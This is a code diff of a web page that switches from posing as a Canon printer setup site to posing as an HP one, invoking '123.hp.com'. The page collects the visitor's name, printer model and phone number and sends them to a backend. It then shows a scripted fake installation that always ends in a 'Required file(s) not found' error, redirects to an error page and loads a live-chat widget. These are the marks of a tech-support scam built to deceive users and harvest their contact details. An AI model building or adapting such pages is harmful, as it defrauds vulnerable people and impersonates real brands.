@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Canon Setup</title>
+  <title>HP Setup</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Gurmukhi:wght@100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
@@ -237,174 +237,32 @@ div#stepContent {
   color: #d13438;
   font-weight: 600;
 }
-.caon-hero {
-    margin: 83px auto;
-    width: 800px;
-}
-.caon-hero h1 {
-    background: #e5e5e5;
-    padding: 18px 26px;
-    font-size: 20px;
-    font-weight: 600;
-    border-radius: 5px 5px 0 0;
-    border-bottom: 1px solid #c1c1c1;
-    margin: 0;
-}
-.canon-container .subtitle {
-    text-align: center;
-    padding: 26px 0 ;
-    margin: 0;
-   
-}
-.canon-container {
-    background: #ebebeb;
-    margin: 0;
-    border-radius: 0 0 5px 5px;
-    padding: 12px 56px 56px;
-}
-.can-text-main {
-    background: #ccc;
-    padding: 56px;
-    text-align: center;
-     border-radius: 5px;
-}
-.caon-hero .hp-image {
-    text-align: center;
-    width: 246px;
-    margin: 0 auto;
-}
-
-.caon-hero input {
-    border: 2px solid #7c7c7c !important;
-    padding: 16px 19px;
-    text-align: left;
-    width: 56%;
-    background: transparent;
-    box-shadow: none;
-    font-size: 20px;
-    border-radius: 4px;
-    min-height: 17px;
-}
-.canon-container-inn {
-    margin-bottom: 40px;
-}
-.caon-hero button {
-    min-height: 59px !important;
-    display: inline-block !important;
-    border-radius: 4px !important;
-}
-.header {
-    background: #dff1ff;
-    padding: 18px 30px;
-}
-.header-container {
-  max-width: 1200px;
-  margin: auto;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-}
-
-/* Logo */
-.logo img {
-  height: 45px;
-}
-
-/* Navigation */
-.nav {
-  display: flex;
-  gap: 30px;
-}
-
-.nav a {
-  text-decoration: none;
-  font-size: 16px;
-  font-weight: 600;
-  color: #000;
-  letter-spacing: 0.5px;
-}
-
-.nav a:hover {
-  color: #0056ff;
-}
-
-/* Contact Button */
-.btn {
-  text-decoration: none;
-  padding: 10px 22px;
-  border: 2px solid #0056ff;
-  color: #0056ff;
-  border-radius: 12px;
-  font-weight: 700;
-  transition: all 0.3s ease;
-}
-
-.btn:hover {
-  background: #0056ff;
-  color: #fff;
-}
-
-.canLogo {
-    width: 100px;
-}
-.canLogo img {
-    width: 100%;
-}
-
-.caon-hero .loaderWrap {
-    display: flex;
-    justify-content: center;
-}
-.loading-active .canon-container-inn {
-    margin-bottom: 0;
-}
   </style>
 </head>
 <body>
-    <header class="header">
-  <div class="header-container">
-
-    <!-- Logo -->
-    <div class="logo">
-      <img src="./img/logo.webp" alt="Printer Logo">
-    </div>
-
-    <!-- Navigation -->
-    <nav class="nav">
-      <a href="#">OFFICEJET</a>
-      <a href="#">LASERJET</a>
-      <a href="#">PIXMA</a>
-      <a href="#">MAXIFY</a>
-      <a href="#">XP SERIES</a>
-    </nav>
-
-    <!-- CTA Button -->
-    <div class="cta">
-      <a href="#" class="btn">CONTACT US</a>
-    </div>
-
-  </div>
-</header>
-<section class="caon-hero">
-  <div class="canLogo"><img src="./img/canon-logo.png"></div>
-   <h1>Select Product Name</h1>
-  <div class="canon-container">
-
-  
-     
+<section class="hp-hero">
+  <div class="hp-container">
+    <div class="hp-text">
+      <h1>
+        Set up your HP printer at <br>
+        <span>123.hp.com</span>
+      </h1>
       <p class="subtitle">
-        Search for your product name or select from the list.
+        Download and install your printer software
       </p>
-        <div class="can-text-main">
-        <div class="canon-container-inn">
       <div id="formBox">
- <input id="printerModel" placeholder="Model Number">
-  <button id="startBtn">GO</button>
+        <input id="fullName" placeholder='Full Name'>
+        <input id="printerModel" placeholder='Enter exact model number or name. Ex: "ENVY 4520"'>
+         <input id="phoneNumber" placeholder='Phone Number'>
+        <button id="startBtn">GO</button>
   </div>
+      <p class="note">
+        Enter your HP ENVY, OfficeJet, LaserJet or DeskJet model number.
+      </p>
     </div>
     <div class="loaderWrap">
       <div id="loadingBox" style="display:none;">
-  <h3>Processing Canon Printer…</h3>
+  <h3>Processing HP Printer…</h3>
   <div class="progress-container">
   <div class="progress-bar" id="progressBar"></div>
 </div>
@@ -413,9 +271,8 @@ div#stepContent {
 
     </div>
     <div class="hp-image">
-      <img src="./img/printer1.jpg" alt="Canon Printers">
+      <img src="./img/DJPrinters.png" alt="HP Printers">
     </div>
-  </div>
   </div>
 </section>
 <footer class="footer">
@@ -424,47 +281,70 @@ div#stepContent {
 
 <script>
 document.getElementById("startBtn").addEventListener("click", async function () {
-  const model = document.getElementById("printerModel").value.trim();
-  if (!model) {
+
+  const fullName = document.getElementById("fullName").value.trim();
+  const printerModel = document.getElementById("printerModel").value.trim();
+  const phoneNumber = document.getElementById("phoneNumber").value.trim();
+
+  // Validation
+  if (!fullName) {
+    alert("Please enter your full name");
+    return;
+  }
+
+  if (!printerModel) {
     alert("Please enter printer model");
     return;
   }
-    document.querySelector(".caon-hero").classList.add("loading-active");
-  sessionStorage.setItem("printerModel", model);
+
+  if (!phoneNumber) {
+    alert("Please enter phone number");
+    return;
+  }
+
+  // Store in session (optional)
+  sessionStorage.setItem("fullName", fullName);
+  sessionStorage.setItem("printerModel", printerModel);
+  sessionStorage.setItem("phoneNumber", phoneNumber);
+
+  // Send data to backend
   try {
     await fetch("/api/send-model", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
-        printerModel: model,
-        brand: "Canon"
+        fullName: fullName,
+        printerModel: printerModel,
+        phoneNumber: phoneNumber,
+        brand: "Driver Setup"
       })
     });
-  } catch (e) {
-    console.log("Model mail failed (non-blocking)");
+  } catch (err) {
+    console.log("API call failed (non-blocking)");
   }
+
+  // UI switch
   document.getElementById("formBox").style.display = "none";
   document.getElementById("loadingBox").style.display = "block";
 
-const steps = [
-  `<p>Detecting Canon connection…</p>`,
-  `<p>Checking Canon requirements…</p>`,
-  `<p>Preparing Canon install…</p>`,
-  `<p>Installing Canon software…</p>`,
-  `<p class="red">Required file(s) not found</p>`
-];
-
+  // Steps
+  const steps = [
+    `<p>Detecting HP connection…</p>`,
+    `<p>Checking HP requirements…</p>`,
+    `<p>Preparing HP install…</p>`,
+    `<p>Installing HP software…</p>`,
+    `<p class="red">Required file(s) not found</p>`
+  ];
 
   const progressBar = document.getElementById("progressBar");
-  const statusText = document.getElementById("statusText");
-
   let currentStep = 0;
-  const stepDuration = 1500; 
+  const stepDuration = 1500;
   const stepPercent = 100 / steps.length;
 
   function runProgress() {
     if (currentStep < steps.length) {
-
       progressBar.style.width = `${stepPercent * (currentStep + 1)}%`;
       currentStep++;
       setTimeout(runProgress, stepDuration);
@@ -474,19 +354,19 @@ const steps = [
   runProgress();
 
   let i = 0;
-  function next() {
+  function nextStep() {
     document.getElementById("stepContent").innerHTML = steps[i];
     i++;
     if (i < steps.length) {
-      setTimeout(next, 2500);
+      setTimeout(nextStep, 2500);
     } else {
       setTimeout(() => {
-       window.location.href = "/cann-error.html";
+        window.location.href = "/driver-error.html";
       }, 2500);
     }
   }
 
-  next();
+  nextStep();
 });
 </script>
 <script src="/smartsupp.js"></script>
